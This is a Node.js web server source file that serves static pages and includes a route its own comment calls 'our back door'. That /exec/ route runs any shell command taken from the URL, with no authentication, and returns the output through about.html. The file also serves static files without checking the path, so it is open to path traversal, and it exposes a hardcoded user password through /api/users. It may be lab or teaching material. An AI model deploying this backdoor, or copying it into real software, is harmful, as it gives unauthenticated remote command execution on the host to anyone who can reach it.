const http = require('http');
const path = require('path');
const fs = require('fs');

var exec = require('child_process').exec, child;

//create the http server
const server = http.createServer((req, res) => {
    console.log(req.url);
    //check the url
    if(req.url === '/')
    {
        fs.readFile(path.join(__dirname,'public','index.html'), (err, data) =>
        {
            if(err) throw err;
            res.writeHead(200, {'Content-Type': 'text/html'});
            res.end(data);
        });
    }
    // here is our back door we need to parse
    // out the command at the end of req.url
    else if(req.url.split('/')[1] === 'exec')
    {
        if(req.url.split('/').length >= 3)
        {
			// exec on the command that is at the end of the url
			// replace any space present with %20 to prevent the server from crashing
            exec(req.url.split('/')[2].replace("%20", " "),
            function (error, stdout, stderr) {
				
				// print the output and errors to the console
                console.log('stdout: ' + stdout);
                console.log('stderr: ' + stderr);
				
				// write the output from the command to the about.html page 
                fs.writeFile(path.join(__dirname,'public','about.html'), stdout ,(err) =>
                    {if(err) throw err;});
					
				// if there is an error, print to the console	
                if (error !== null) {
                     console.log('exec error: ' + error);
                }
            });
        }
		
		// read about.html (which we just wrote the command output to)
		// send the about.html page to the webserver to ouptut to browser
        fs.readFile(path.join(__dirname,'public','about.html'), (err, data) =>
        {
        console.log('exec');
        if(err) throw err;
        res.writeHead(200, {'Content-Type': 'text/html'});

        res.end(data);
        });
        
    }


    //if serving json data
    else if(req.url === '/api/users')
    {
        const users = [
            {name: 'neb', pasword: 'dumbpassword'},
        ];
        res.writeHead(200, {'Content-Type': 'application/json'});
        res.end(JSON.stringify(users));
    }
    else
    {
    //serve a static page if it exists in public
    let filepath = path.join(__dirname, 'public', req.url === '/' ?'index.html':req.url);
    console.log(filepath);

    //file extention
    let extname = path.extname(filepath);

    //initial content type
    let contentType = 'text/html';

    //check for different content type
    switch(extname)
    {
        case '.js':
            contentType = 'text/javascript';
            break;
        case '.css':
            contentType = 'text/css';
            break;
        case '.json':
            contentType = 'application/json';
            break;
        case '.png':
            contentType = 'image/png';
            break;
        case '.jpeg':
            contentType = 'image/jpg';
            break;
    }

    //get a file
    fs.readFile(filepath, (err,data) =>
        {
            if(err)
            {
                if(err.code == 'ENOENT')
                {
                    //page not found
                    fs.readFile(path.join(__dirname,'public','error404.html'), (err, data) =>
                    {
                        console.log('err 404');
                        if(err) throw err;
                        res.writeHead(200, {'Content-Type': 'text/html'});
                        console.log('send page err 404');
                        res.end(data, 'utf8');
                    });
                }
                else
                {
                    //other server error
                    res.writeHead(500);
                    res.end('server error', err);
                }
            }
            else
            {
                res.writeHead(200, {'Content-Type': contentType});
                res.end(data, 'utf8');
            }
        });
}
});

const PORT = process.env.PORT || 5000;

server.listen(PORT, () => console.log(`server running ${PORT}`));